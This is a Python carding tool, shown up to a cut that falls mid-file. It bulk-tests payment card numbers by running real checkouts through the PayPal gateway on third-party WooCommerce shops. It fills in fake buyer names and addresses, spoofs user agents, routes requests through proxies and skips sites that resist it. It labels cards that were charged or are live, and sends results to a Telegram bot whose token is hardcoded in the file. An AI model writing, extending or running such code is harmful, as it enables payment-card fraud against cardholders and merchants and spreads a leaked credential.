#!/usr/bin/env python3
"""
Async PayPal Credit Card Gateway Checker - Optimized for Production
Supports high concurrency with proper resource management and error handling.
Features:
- Bad site auto-detection and removal
- Streaming results for mass checking
- Connection pooling and rate limiting
- Optimized for fast production use
- Empty response detection with retry logic
- Multiple BIN lookup APIs with fallback
- Gateway usage statistics tracking
"""
import asyncio
import aiohttp
import json
import re
import random
import time
import os
import sys
import logging
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any, Callable, AsyncGenerator
import ssl

# Import rate limiter and metrics
from .rate_limiter import global_rate_limiter, domain_rate_limiter
from .metrics import metrics_collector
from .site_manager import (
    load_sites, get_available_sites, check_and_handle_bad_site,
    is_bad_response, add_bad_site, BAD_SITE_PATTERNS
)

# Import gateway stats tracker
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'core'))
try:
    from gateway_stats import track_request_start, track_request_end
    GATEWAY_STATS_AVAILABLE = True
except ImportError:
    GATEWAY_STATS_AVAILABLE = False
    def track_request_start(gateway): pass
    def track_request_end(gateway, success, response_time=0): pass

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ppcp_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global session and cache
_session = None
_bin_cache = {}  # Simple dict cache for BIN info

# Configuration
class Config:
    """Configuration settings for production use - optimized for bare metal server with high concurrency"""
    TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', '7723561160:AAHZp0guO69EmC_BumauDsDeseTvh7GY3qA')
    CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1003171561914')
    TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', '20'))  # Balanced timeout
    MAX_CONCURRENT_REQUESTS = int(os.getenv('MAX_CONCURRENT_REQUESTS', '200'))  # High concurrency for bare metal
    MAX_RETRIES = int(os.getenv('MAX_RETRIES', '2'))  # Reduced retries for speed
    RETRY_DELAY = float(os.getenv('RETRY_DELAY', '0.3'))  # Faster retry
    RATE_LIMIT_PER_SECOND = int(os.getenv('RATE_LIMIT_PER_SECOND', '100'))  # High rate limit for bare metal
    BIN_CHECK_TIMEOUT = int(os.getenv('BIN_CHECK_TIMEOUT', '5'))  # Faster BIN check
    CONNECTION_LIMIT = int(os.getenv('CONNECTION_LIMIT', '500'))  # Large connection pool for bare metal
    CONNECTION_LIMIT_PER_HOST = int(os.getenv('CONNECTION_LIMIT_PER_HOST', '50'))  # Higher per-host limit

# Address data
class AddressData:
    """Address data for different countries"""
    ADDRESSES = {
        'NZ': [
            {'street': '248 Princes Street', 'city': 'Grafton', 'zip': '1010', 'state': 'Auckland', 'phone': '(028) 8784-059'},
            {'street': '75 Queen Street', 'city': 'Auckland', 'zip': '1010', 'state': 'Auckland', 'phone': '(029) 1234-567'},
        ],
        'AU': [
            {'street': '123 George Street', 'city': 'Sydney', 'zip': '2000', 'state': 'NSW', 'phone': '+61 2 1234 5678'},
            {'street': '456 Collins Street', 'city': 'Melbourne', 'zip': '3000', 'state': 'VIC', 'phone': '+61 3 8765 4321'},
        ],
        'JP': [
            {'street': '1 Chome-1-2 Oshiage', 'city': 'Sumida City, Tokyo', 'zip': '131-0045', 'state': 'Tokyo', 'phone': '+81 3-1234-5678'},
        ],
        'PH': [
            {'street': '1234 Makati Ave', 'city': 'Makati', 'zip': '1200', 'state': 'Metro Manila', 'phone': '+63 2 1234 5678'},
        ],
        'MY': [
            {'street': 'No 56, Jalan Bukit Bintang', 'city': 'Kuala Lumpur', 'zip': '55100', 'state': 'Wilayah Persekutuan', 'phone': '+60 3-1234 5678'},
        ],
        'GB': [
            {'street': '10 Downing Street', 'city': 'London', 'zip': 'SW1A 2AA', 'state': '', 'phone': '+44 20 7925 0918'},
        ],
        'CA': [
            {'street': '123 Main Street', 'city': 'Toronto', 'zip': 'M5H 2N2', 'state': 'Ontario', 'phone': '(416) 555-0123'},
        ],
        'SG': [
            {'street': '10 Anson Road', 'city': 'Singapore', 'zip': '079903', 'state': 'Central Region', 'phone': '(+65) 6221-1234'},
        ],
        'TH': [
            {'street': '123 Sukhumvit Road', 'city': 'Bangkok', 'zip': '10110', 'state': 'Bangkok', 'phone': '(+66) 2-123-4567'},
        ],
        'HK': [
            {'street': "1 Queen's Road Central", 'city': 'Central', 'zip': '', 'state': 'Hong Kong Island', 'phone': '(+852) 2523-1234'},
        ],
        'ZA': [
            {'street': '10 Adderley Street', 'city': 'Cape Town', 'zip': '8000', 'state': 'Western Cape', 'phone': '(+27) 21-123-4567'},
        ],
        'NL': [
            {'street': '1 Dam Square', 'city': 'Amsterdam', 'zip': '1012 JS', 'state': 'North Holland', 'phone': '(+31) 20-555-1234'},
        ],
        'US': [
            {'street': '1600 Pennsylvania Avenue NW', 'city': 'Washington', 'zip': '20500', 'state': 'DC', 'phone': '+1 202-456-1111'},
            {'street': '1 Infinite Loop', 'city': 'Cupertino', 'zip': '95014', 'state': 'CA', 'phone': '+1 408-996-1010'},
        ],
    }

class NameGenerator:
    """Generate random names and emails"""
    FIRST_NAMES = ['John', 'Kyla', 'Sarah', 'Michael', 'Emma', 'James', 'Olivia', 'William', 'Ava', 'Benjamin']
    LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor']
    EMAIL_DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'icloud.com', 'hotmail.com']

    @staticmethod
    def generate() -> Tuple[str, str, str]:
        """Generate random first name, last name, and email"""
        fname = random.choice(NameGenerator.FIRST_NAMES)
        lname = random.choice(NameGenerator.LAST_NAMES)
        domain = random.choice(NameGenerator.EMAIL_DOMAINS)
        email = f"{fname.lower()}.{lname.lower()}@{domain}"
        return fname, lname, email

class UserAgentGenerator:
    """Generate random user agents"""
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]

    @staticmethod
    def get() -> str:
        return random.choice(UserAgentGenerator.USER_AGENTS)

class TelegramNotifier:
    """Send notifications to Telegram asynchronously"""

    @staticmethod
    async def send_message(message: str, token: str, chat_id: str):
        """Send message to Telegram"""
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            data = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data, timeout=10) as response:
                    if response.status != 200:
                        logger.warning(f"Telegram notification failed: {response.status}")
        except Exception as e:
            logger.error(f"Telegram error: {e}")


class BinChecker:
    """Check BIN information with caching and multiple fallback APIs"""

    @staticmethod
    async def check(bin_number: str, ua: str) -> Dict[str, str]:
        """Get BIN information with caching and multiple fallback APIs"""
        global _bin_cache
        
        # Check cache first
        if bin_number in _bin_cache:
            cache_entry = _bin_cache[bin_number]
            # Check if cache is still valid (1 hour TTL)
            if time.time() - cache_entry['timestamp'] < 3600:
                return cache_entry['data']
        
        # Try multiple APIs in order
        result = None
        
        # Try antipublic.cc first (same as /b3 command)
        result = await BinChecker._check_antipublic(bin_number, ua)
        
        # If antipublic failed, try bincheck.io
        if not result or result.get('brand') == 'Unknown':
            result_bincheck = await BinChecker._check_bincheck(bin_number, ua)
            if result_bincheck and result_bincheck.get('brand') != 'Unknown':
                result = result_bincheck
        
        # If still no result, try handyapi
        if not result or result.get('brand') == 'Unknown':
            result_lookup = await BinChecker._check_handyapi(bin_number, ua)
            if result_lookup and result_lookup.get('brand') != 'Unknown':
                result = result_lookup
        
        # Default result if all APIs fail
        if not result:
            result = {
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'issuer': 'Unknown',
                'country': 'Unknown'
            }
        
        # Cache the result
        _bin_cache[bin_number] = {
            'data': result,
            'timestamp': time.time()
        }
        
        return result

    @staticmethod
    async def _check_antipublic(bin_number: str, ua: str) -> Optional[Dict[str, str]]:
        """Check BIN using bins.antipublic.cc API (same as /b3 command)"""
        try:
            url = f'https://bins.antipublic.cc/bins/{bin_number}'
            headers = {
                'user-agent': ua,
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9'
            }
            
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=Config.BIN_CHECK_TIMEOUT, ssl=ssl_context) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        if data:
                            # Extract and normalize card type
                            raw_type = (data.get('type') or data.get('card_type') or '').lower().strip()
                            if 'debit' in raw_type:
                                card_type = 'DEBIT'
                            elif 'credit' in raw_type:
                                card_type = 'CREDIT'
                            else:
                                card_type = 'Unknown'
                            
                            # Extract and normalize brand
                            raw_brand = data.get('brand') or data.get('card_brand') or data.get('card') or ''
                            if raw_brand:
                                raw_brand_lower = raw_brand.lower()
                                if 'visa' in raw_brand_lower:
                                    brand = 'VISA'
                                elif 'mastercard' in raw_brand_lower or 'master' in raw_brand_lower:
                                    brand = 'MASTERCARD'
                                elif 'amex' in raw_brand_lower or 'american express' in raw_brand_lower:
                                    brand = 'AMEX'
                                elif 'discover' in raw_brand_lower:
                                    brand = 'DISCOVER'
                                else:
                                    brand = raw_brand.upper()
                            else:
                                brand = 'Unknown'
                            
                            # Extract level
                            level = data.get('level') or data.get('card_level') or 'Unknown'
                            if level and level != 'Unknown':
                                level = level.upper()
                            
                            # Extract bank/issuer
                            if isinstance(data.get('bank'), dict):
                                issuer = data.get('bank', {}).get('name') or 'Unknown'
                            else:
                                issuer = data.get('bank') or data.get('issuer') or data.get('bank_name') or 'Unknown'
                            
                            # Extract country
                            if isinstance(data.get('country'), dict):
                                country = data.get('country', {}).get('name') or 'Unknown'
                            else:
                                country = data.get('country') or data.get('country_name') or 'Unknown'
                            
                            return {
                                'brand': brand or 'Unknown',
                                'type': card_type or 'Unknown',
                                'level': level or 'Unknown',
                                'issuer': issuer or 'Unknown',
                                'country': country or 'Unknown'
                            }
        except Exception as e:
            logger.debug(f"bins.antipublic.cc check failed for {bin_number}: {e}")
        return None

    @staticmethod
    async def _check_bincheck(bin_number: str, ua: str) -> Optional[Dict[str, str]]:
        """Check BIN using bincheck.io (scraping)"""
        try:
            url = f'https://bincheck.io/details/{bin_number}'
            headers = {
                'user-agent': ua,
                'referer': 'https://bincheck.io/',
                'accept-language': 'en-US,en;q=0.9'
            }
            
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=Config.BIN_CHECK_TIMEOUT, ssl=ssl_context) as response:
                    html = await response.text()

            # Parse BIN info
            card_brand = BinChecker._extract_field(html, r'Card\s*Brand')
            card_type = BinChecker._extract_field(html, r'Card\s*Type')
            card_level = BinChecker._extract_field(html, r'Card\s*Level')

            # Extract issuer
            issuer_match = re.search(r'<td[^>]*>\s*Issuer\s*Name\s*/\s*Bank\s*</td>\s*<td[^>]*>.*?<a[^>]*title="([^"]+)"', html, re.I)
            issuer_name = issuer_match.group(1).strip() if issuer_match else 'Unknown'
            issuer_name = re.sub(r'^Complete\s*', '', issuer_name, flags=re.I)
            issuer_name = re.sub(r'\s*database.*$', '', issuer_name, flags=re.I)
            issuer_name = re.sub(r'\s*-\s*[A-Z\s]+$', '', issuer_name, flags=re.I)

            # Extract country
            country_match = re.search(r'<td[^>]*>\s*ISO\s*Country\s*Name\s*</td>\s*<td[^>]*>.*?<a[^>]*title="([^"]+)"', html, re.I)
            iso_country = country_match.group(1).strip() if country_match else 'Unknown'
            iso_country = re.sub(r'^Complete\s*', '', iso_country, flags=re.I)
            iso_country = re.sub(r'\s*database.*$', '', iso_country, flags=re.I)

            return {
                'brand': card_brand,
                'type': card_type,
                'level': card_level,
                'issuer': issuer_name,
                'country': iso_country
            }
        except Exception as e:
            logger.debug(f"bincheck.io check failed for {bin_number}: {e}")
        return None

    @staticmethod
    async def _check_handyapi(bin_number: str, ua: str) -> Optional[Dict[str, str]]:
        """Check BIN using handyapi.com"""
        try:
            url = f'https://data.handyapi.com/bin/{bin_number}'
            headers = {
                'user-agent': ua,
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9'
            }
            
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=Config.BIN_CHECK_TIMEOUT, ssl=ssl_context) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        if data.get('Status') == 'SUCCESS':
                            return {
                                'brand': data.get('Scheme', 'Unknown').upper() if data.get('Scheme') else 'Unknown',
                                'type': data.get('Type', 'Unknown').upper() if data.get('Type') else 'Unknown',
                                'level': data.get('CardTier', 'Unknown').upper() if data.get('CardTier') else 'Unknown',
                                'issuer': data.get('Issuer', 'Unknown') or 'Unknown',
                                'country': data.get('CountryName', 'Unknown') or 'Unknown'
                            }
        except Exception as e:
            logger.debug(f"handyapi.com check failed for {bin_number}: {e}")
        return None

    @staticmethod
    def _extract_field(html: str, field_name: str) -> str:
        """Extract field from HTML"""
        pattern = f'<td[^>]*>\\s*{field_name}\\s*</td>\\s*<td[^>]*>\\s*(.*?)\\s*</td>'
        match = re.search(pattern, html, re.I)
        return match.group(1).strip() if match else 'Unknown'


class AsyncCardChecker:
    """Async card checker with proper resource management"""

    def __init__(self, cc_data: str, site_url: str, proxy: Optional[str] = None, session: aiohttp.ClientSession = None):
        self.cc_data = cc_data
        self.site_url = site_url
        self.proxy = proxy
        self.session = session
        self.ua = UserAgentGenerator.get()
        self.start_time = time.time()
        
        # Parse card data
        parts = cc_data.split('|')
        self.cc = parts[0].strip()
        self.mes = parts[1].strip().zfill(2)
        self.ano = parts[2].strip()
        self.cvv = parts[3].strip()

        # Fix year format
        if len(self.ano) == 2:
            self.ano = f"20{self.ano}"

        self.cc6 = self.cc[:6]

        # Setup proxy
        self.proxies = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) >= 2:
                if len(proxy_parts) == 4:
                    self.proxies = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                else:
                    self.proxies = f"http://{proxy_parts[0]}:{proxy_parts[1]}"

        # Parse site
        parsed = urlparse(site_url)
        self.hostname = parsed.netloc
        self.country = self._detect_country()

        # Get address
        address = self._get_address()
        self.street = address['street']
        self.city = address['city']
        self.zip = address['zip']
        self.state = address['state']
        self.phone = address['phone']

        # Generate name
        self.fname, self.lname, self.email = NameGenerator.generate()

    def _detect_country(self) -> str:
        """Detect country from domain"""
        hostname_lower = self.hostname.lower()
        if hostname_lower.endswith('.co.uk'):
            return 'GB'
        elif hostname_lower.endswith('.au'):
            return 'AU'
        elif hostname_lower.endswith('.ca'):
            return 'CA'
        elif hostname_lower.endswith('.co.nz'):
            return 'NZ'
        elif hostname_lower.endswith('.jp'):
            return 'JP'
        elif hostname_lower.endswith('.ph'):
            return 'PH'
        elif hostname_lower.endswith('.my'):
            return 'MY'
        elif hostname_lower.endswith('.sg'):
            return 'SG'
        elif hostname_lower.endswith('.th'):
            return 'TH'
        elif hostname_lower.endswith('.nl'):
            return 'NL'
        elif hostname_lower.endswith('.hk'):
            return 'HK'
        elif hostname_lower.endswith('.co.za'):
            return 'ZA'
        else:
            return 'US'

    def _get_address(self) -> Dict[str, str]:
        """Get address for country"""
        addresses = AddressData.ADDRESSES.get(self.country, AddressData.ADDRESSES['US'])
        index = int(time.time() / 10) % len(addresses)
        return addresses[index]

    def _get_headers(self, extra: Optional[Dict] = None) -> Dict[str, str]:
        """Get request headers"""
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': self.ua,
            'referer': f'https://{self.hostname}/',
        }
        if extra:
            headers.update(extra)
        return headers

    async def check(self) -> Dict[str, Any]:
        """Check the card asynchronously with bad site detection"""
        try:
            # Step 1: Get product page
            product_page = await self._get_product_page()
            if not product_page:
                error_msg = "Failed to load product page"
                check_and_handle_bad_site(self.site_url, error_msg)
                return self._error_result(error_msg, check_bad_site=True)

            # Check for bad site patterns in product page
            is_bad, reason = is_bad_response(product_page)
            if is_bad:
                add_bad_site(self.site_url, reason)
                return self._error_result(f"Bad site detected: {reason}", check_bad_site=True)

            # Step 2: Parse product ID
            product_id, variation_id = self._parse_product_id(product_page)
            if not product_id:
                error_msg = "Cannot find product ID"
                check_and_handle_bad_site(self.site_url, error_msg)
                return self._error_result(error_msg, check_bad_site=True)

            # Step 3: Add to cart
            atc_url = self._build_atc_url(product_id, variation_id)
            atc_result = await self._add_to_cart(atc_url)
            
            # Check for out of stock in add to cart response
            if atc_result:
                is_bad, reason = is_bad_response(atc_result)
                if is_bad:
                    add_bad_site(self.site_url, reason)
                    return self._error_result(f"Bad site detected: {reason}", check_bad_site=True)

            # Step 4: Get checkout page
            checkout_html = await self._get_checkout()
            if not checkout_html:
                error_msg = "Failed to load checkout"
                check_and_handle_bad_site(self.site_url, error_msg)
                return self._error_result(error_msg, check_bad_site=True)

            # Check for bad site patterns in checkout
            is_bad, reason = is_bad_response(checkout_html)
            if is_bad:
                add_bad_site(self.site_url, reason)
                return self._error_result(f"Bad site detected: {reason}", check_bad_site=True)

            # Step 5: Parse nonces and price
            nonces = self._parse_nonces(checkout_html)
            price = self._parse_price(checkout_html)

            # Step 6: Get client ID
            access_token = await self._get_client_id(nonces.get('client_nonce'))
            if not access_token:
                error_msg = "Failed to get access token"
                check_and_handle_bad_site(self.site_url, error_msg)
                return self._error_result(error_msg, check_bad_site=True)

            # Step 7: Create order
            order_id, custom_id = await self._create_order(nonces.get('create_order_nonce'))
            if not order_id:
                error_msg = "ERROR: Failed to create order"
                check_and_handle_bad_site(self.site_url, error_msg)
                return self._error_result(error_msg, check_bad_site=True)

            # Step 8: Confirm payment
            confirm_result = await self._confirm_payment(order_id, access_token)

            # Step 9: Approve order
            approve_result = await self._approve_order(order_id, nonces.get('approve_order_nonce'))

            # Step 10: Process checkout
            payment_result = await self._process_checkout(custom_id, nonces.get('checkout_nonce'))

            # Step 11: Parse result (also checks for bad site patterns)
            return await self._parse_result(payment_result, price)

        except Exception as e:
            logger.error(f"Exception checking card {self.cc}: {e}")
            error_msg = f"Exception: {str(e)}"
            check_and_handle_bad_site(self.site_url, error_msg)
            return self._error_result(error_msg)

    async def _get_with_retry(self, url: str, headers: Dict, **kwargs) -> Optional[str]:
        """Get URL with retry logic, rate limiting, and metrics"""
        parsed_url = urlparse(url)
        domain = parsed_url.netloc

        start_time = time.time()
        for attempt in range(Config.MAX_RETRIES):
            try:
                await global_rate_limiter.acquire()
                await domain_rate_limiter.acquire(domain)

                async with self.session.get(
                    url, headers=headers, proxy=self.proxies, timeout=Config.TIMEOUT, **kwargs
                ) as response:
                    response_time = time.time() - start_time
                    metrics_collector.record_request(domain, True, response_time, response.status)
                    return await response.text()
            except Exception as e:
                if attempt == Config.MAX_RETRIES - 1:
                    response_time = time.time() - start_time
                    metrics_collector.record_request(domain, False, response_time)
                    logger.error(f"Failed to get {url} after {Config.MAX_RETRIES} attempts: {e}")
                    return None
                await asyncio.sleep(Config.RETRY_DELAY * (2 ** attempt))
        return None

    async def _post_with_retry(self, url: str, headers: Dict, data: Any = None, **kwargs) -> Optional[str]:
        """Post URL with retry logic, rate limiting, and metrics"""
        parsed_url = urlparse(url)
        domain = parsed_url.netloc

        start_time = time.time()
        for attempt in range(Config.MAX_RETRIES):
            try:
                await global_rate_limiter.acquire()
                await domain_rate_limiter.acquire(domain)

                async with self.session.post(
                    url, headers=headers, data=data, proxy=self.proxies, timeout=Config.TIMEOUT, **kwargs
                ) as response:
                    response_time = time.time() - start_time
                    metrics_collector.record_request(domain, True, response_time, response.status)
                    return await response.text()
            except Exception as e:
                if attempt == Config.MAX_RETRIES - 1:
                    response_time = time.time() - start_time
                    metrics_collector.record_request(domain, False, response_time)
                    logger.error(f"Failed to post {url} after {Config.MAX_RETRIES} attempts: {e}")
                    return None
                await asyncio.sleep(Config.RETRY_DELAY * (2 ** attempt))
        return None

    async def _get_product_page(self) -> Optional[str]:
        """Get product page HTML"""
        return await self._get_with_retry(self.site_url, self._get_headers())

    def _parse_product_id(self, html: str) -> Tuple[Optional[str], Optional[str]]:
        """Parse product ID and variation ID from HTML"""
        # Try variations form
        form_match = re.search(r'<form[^>]+class="variations_form cart"[^>]+data-product_id="([^"]+)"', html)
        if form_match:
            product_id = form_match.group(1)
            var_match = re.search(r'data-product_variations="([^"]+)"', html)
            if var_match and var_match.group(1) != 'false':
                try:
                    var_data = json.loads(var_match.group(1).replace('&quot;', '"'))
                    if var_data and len(var_data) > 0:
                        return product_id, var_data[0].get('variation_id')
                except:
                    pass
            return product_id, None

        # Try input field
        input_match = re.search(r'<input[^>]+name="(?:product_id|add-to-cart)"[^>]+value="([^"]+)"', html)
        if input_match:
            return input_match.group(1), None

        # Try button
        button_match = re.search(r'<button[^>]+name="add-to-cart"[^>]+value="([^"]+)"', html)
        if button_match:
            return button_match.group(1), None

        return None, None

    def _build_atc_url(self, product_id: str, variation_id: Optional[str]) -> str:
        """Build add to cart URL"""
        params = {
            'quantity': '1',
            'add-to-cart': product_id
        }
        if variation_id:
            params['variation_id'] = variation_id
            params['product_id'] = product_id

        return f"{self.site_url}?{urlencode(params)}"

    async def _add_to_cart(self, url: str) -> Optional[str]:
        """Add product to cart"""
        return await self._get_with_retry(url, self._get_headers())

    async def _get_checkout(self) -> Optional[str]:
        """Get checkout page"""
        checkout_url = f"https://{self.hostname}/checkout"
        return await self._get_with_retry(checkout_url, self._get_headers())

    def _parse_nonces(self, html: str) -> Dict[str, str]:
        """Parse nonces from checkout page"""
        nonces = {}

        # Create order nonce
        match = re.search(r'"create_order":\{"endpoint":".*?","nonce":"([^"]+)"', html)
        if match:
            nonces['create_order_nonce'] = match.group(1)

        # Approve order nonce
        match = re.search(r'"approve_order":\{"endpoint":".*?","nonce":"([^"]+)"', html)
        if match:
            nonces['approve_order_nonce'] = match.group(1)

        # Client nonce
        match = re.search(r'"data_client_id":\s*\{\s*"set_attribute":.*?\s*"endpoint":.*?\s*"nonce":\s*"([^"]+)"', html)
        if match:
            nonces['client_nonce'] = match.group(1)

        # Checkout nonce
        match = re.search(r'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="([^"]+)"', html)
        if match:
            nonces['checkout_nonce'] = match.group(1)

        return nonces

    def _parse_price(self, html: str) -> str:
        """Parse price from checkout page"""
        pattern = r'<tr class="order-total">.*?<th>Total</th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)</span>\s*([\d.]+)'
        match = re.search(pattern, html, re.DOTALL)
        if match:
            symbol = match.group(1).replace('&pound;', '£')
            amount = match.group(2)
            return f"{symbol}{amount}"
        return "N/A"

    async def _get_client_id(self, nonce: Optional[str]) -> Optional[str]:
        """Get PayPal client ID and access token"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-data-client-id"
            headers = self._get_headers({
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-requested-with': 'XMLHttpRequest',
            })

            data = {
                'set_attribute': 'true',
                'nonce': nonce or '',
                'user': '0',
                'has_subscriptions': 'false',
                'paypal_subscriptions_enabled': 'false'
            }

            response_text = await self._post_with_retry(url, headers, json.dumps(data))
            if not response_text:
                return None

            result = json.loads(response_text)
            token = result.get('token')
            if token:
                import base64
                decoded = base64.b64decode(token).decode('utf-8')
                token_data = json.loads(decoded)
                return token_data.get('paypal', {}).get('accessToken')
        except Exception as e:
            logger.error(f"Error getting client ID: {e}")
        return None

    async def _create_order(self, nonce: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
        """Create PayPal order"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-create-order"
            headers = self._get_headers({
                'content-type': 'application/json',
            })

            form_data = {
                'billing_first_name': self.fname,
                'billing_last_name': self.lname,
                'billing_company': '',
                'billing_country': self.country,
                'billing_address_1': self.street,
                'billing_address_2': '',
                'billing_city': self.city,
                'billing_state': self.state,
                'billing_postcode': self.zip,
                'billing_phone': self.phone,
                'billing_email': self.email,
                'payment_method': 'ppcp-gateway',
                'terms': 'on',
                'woocommerce-process-checkout-nonce': nonce or '',
            }

            payload = {
                'nonce': nonce or '',
                'payer': None,
                'bn_code': 'Woo_PPCP',
                'context': 'checkout',
                'order_id': '0',
                'payment_method': 'ppcp-gateway',
                'form_encoded': urlencode(form_data),
                'createaccount': False,
                'save_payment_method': False
            }

            response_text = await self._post_with_retry(url, headers, json.dumps(payload))
            if not response_text:
                return None, None

            result = json.loads(response_text)
            if result.get('success'):
                return result['data']['id'], result['data'].get('custom_id')
        except Exception as e:
            logger.error(f"Error creating order: {e}")
        return None, None

    async def _confirm_payment(self, order_id: str, access_token: str) -> Optional[str]:
        """Confirm payment with PayPal"""
        try:
            url = f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source"
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'authorization': f'Bearer {access_token}',
                'user-agent': self.ua,
            }

            payload = {
                'payment_source': {
                    'card': {
                        'number': self.cc,
                        'security_code': self.cvv,
                        'expiry': f'{self.ano}-{self.mes}'
                    }
                }
            }

            return await self._post_with_retry(url, headers, json.dumps(payload))
        except Exception as e:
            logger.error(f"Error confirming payment: {e}")
        return None

    async def _approve_order(self, order_id: str, nonce: Optional[str]) -> Optional[str]:
        """Approve PayPal order"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-approve-order"
            headers = self._get_headers({
                'content-type': 'application/json',
            })

            payload = {
                'nonce': nonce or '',
                'order_id': order_id
            }

            return await self._post_with_retry(url, headers, json.dumps(payload))
        except Exception as e:
            logger.error(f"Error approving order: {e}")
        return None

    async def _process_checkout(self, custom_id: Optional[str], nonce: Optional[str]) -> Optional[str]:
        """Process final checkout"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=checkout"
            headers = self._get_headers({
                'content-type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'XMLHttpRequest',
            })

            data = {
                'billing_first_name': self.fname,
                'billing_last_name': self.lname,
                'billing_company': '',
                'billing_country': self.country,
                'billing_address_1': self.street,
                'billing_address_2': '',
                'billing_city': self.city,
                'billing_state': self.state,
                'billing_postcode': self.zip,
                'billing_phone': self.phone,
                'billing_email': self.email,
                'payment_method': 'ppcp-gateway',
                'terms': 'on',
                'woocommerce-process-checkout-nonce': nonce or '',
                'ppcp-resume-order': custom_id or ''
            }

            return await self._post_with_retry(url, headers, urlencode(data))
        except Exception as e:
            logger.error(f"Error processing checkout: {e}")
        return None

    async def _parse_result(self, payment_result: Optional[str], price: str) -> Dict[str, Any]:
        """Parse payment result"""
        if not payment_result:
            return self._error_result("No payment response")

        # Get BIN info
        bin_info = await BinChecker.check(self.cc6, self.ua)

        result = {
            'cc': self.cc_data,
            'site': self.hostname,
            'price': price,
            'bin_info': bin_info,
            'status': 'DEAD',
            'message': 'Unknown error'
        }

        # Check for success
        if '"result":"success"' in payment_result and 'order-received' in payment_result:
            try:
                data = json.loads(payment_result)
                receipt_url = data.get('data', {}).get('redirect')
                if receipt_url:
                    result['status'] = 'CVV'
                    result['message'] = 'CVV CHARGED'
                    result['receipt'] = receipt_url

                    elapsed_time = time.time() - self.start_time

                    response_text = f"""CVV ✅

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CVV CHARGED

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')} - {bin_info.get('level', 'Unknown')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'Unknown')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'Unknown')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

                    result['response_text'] = response_text
                    result['formatted_status'] = 'CVV'

                    return result
            except Exception as e:
                logger.error(f"Error parsing success response: {e}")

        # Check for specific errors
        error_patterns = {
            'PAYMENT_DENIED': ('CCN', 'PAYMENT_DENIED - LIVE CC'),
            'ORDER_NOT_APPROVED': ('DEAD', 'ORDER_NOT_APPROVED'),
            'Order not approved': ('DEAD', 'ORDER_NOT_APPROVED'),
            'Could not capture': ('DEAD', 'COULD_NOT_CAPTURE_PAYPAL_ORDER'),
            'could not capture': ('DEAD', 'COULD_NOT_CAPTURE_PAYPAL_ORDER'),
            'TRANSACTION_REFUSED': ('DEAD', 'TRANSACTION_REFUSED'),
